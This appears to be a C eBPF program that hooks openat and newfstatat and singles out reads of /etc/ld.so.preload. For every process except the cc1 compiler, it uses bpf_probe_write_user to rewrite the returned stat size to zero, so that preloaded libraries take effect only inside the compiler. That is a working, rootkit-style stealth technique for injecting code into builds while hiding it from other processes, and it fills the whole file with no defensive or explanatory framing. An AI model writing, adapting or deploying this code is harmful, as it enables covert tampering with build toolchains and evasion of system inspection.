#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "preload_filter.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

char preload_name[] = "/etc/ld.so.preload";

struct {
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, tid_t);
  __type(value, u8);
} tids SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, tid_t);
  __type(value, u64);
} stat_ps SEC(".maps");

bool comm_filter(char *comm) {
  if (!(__builtin_memcmp("cc1\0", comm, 4) == 0)) {
    return 0;
  }
  return 1;
}

SEC("tracepoint/syscalls/sys_enter_openat")
int handle_enter_openat(struct trace_event_raw_sys_enter *ctx) {
  tid_t tid = bpf_get_current_pid_tgid();

  char comm[16];
  bpf_get_current_comm(comm, 16);

  if (comm_filter(comm)) {
    return 0;
  }

  char *filename_p = (char *)ctx->args[1];

  char filename[20];
  long success = bpf_probe_read_user(filename, 20, filename_p);

  if (!((__builtin_memcmp(preload_name, filename, 4) == 0) &&
        (__builtin_memcmp(preload_name + 4, filename + 4, 4) == 0) &&
        (__builtin_memcmp(preload_name + 8, filename + 8, 4) == 0) &&
        (__builtin_memcmp(preload_name + 12, filename + 12, 4) == 0) &&
        (__builtin_memcmp(preload_name + 16, filename + 16, 2) == 0))) {
    return 0;
  }

  bpf_printk("[sys_enter_openat] Detected reading %s", filename);

  u8 blank = 0;
  bpf_map_update_elem(&tids, &tid, &blank, BPF_ANY);

  return 0;
}

SEC("tracepoint/syscalls/sys_enter_newfstatat")
int handle_enter_newfstatat(struct trace_event_raw_sys_enter *ctx) {
  tid_t tid = bpf_get_current_pid_tgid();

  char comm[16];
  bpf_get_current_comm(comm, 16);
  if (comm_filter(comm)) {
    // Do not modify preload file for specified comm
    return 0;
  }

  long unsigned int *blank_p = bpf_map_lookup_elem(&tids, &tid);
  if (blank_p == NULL) {
    // Only modify the stat of the marked file
    return 0;
  }

  void *stat_p = (void *)ctx->args[2];

  struct stat statbuf;
  long success = bpf_probe_read_user(&statbuf, sizeof(struct stat), stat_p);

  bpf_map_update_elem(&stat_ps, &tid, &stat_p, BPF_ANY);

  return 0;
}

/*
    Modify stat.st_size = 0 for syscalls for **not specified comm** and
   **reading /etc/ld.so.preload**
*/
SEC("tracepoint/syscalls/sys_exit_newfstatat")
int handle_exit_newfstatat(struct trace_event_raw_sys_exit *ctx) {
  char comm[16];
  bpf_get_current_comm(comm, 16);
  if (comm_filter(comm)) {
    return 0;
  }

  tid_t tid = bpf_get_current_pid_tgid();

  long unsigned int *blank_p = bpf_map_lookup_elem(&tids, &tid);
  if (blank_p == NULL) {
    return 0;
  }
  bpf_map_delete_elem(&tids, &tid);

  long unsigned int *stat_pp = bpf_map_lookup_elem(&stat_ps, &tid);
  if (stat_pp == NULL) {
    return 0;
  }
  bpf_map_delete_elem(&stat_ps, &tid);

  struct stat *stat_p = (struct stat *)*stat_pp;
  struct stat statbuf;
  long success = bpf_probe_read_user(&statbuf, sizeof(struct stat), stat_p);

  long int replace_size = 0;
  bpf_printk(
      "[sys_exit_newfstatat] OVERWRITING stat.st_size at %p from %d to %d",
      stat_p, statbuf.st_size, replace_size);
  success = bpf_probe_write_user((char *)stat_p + 48, (char *)&replace_size,
                                 sizeof(long int));
  bpf_printk("[sys_exit_newfstatat] RESULT %d", success);

  return 0;
}
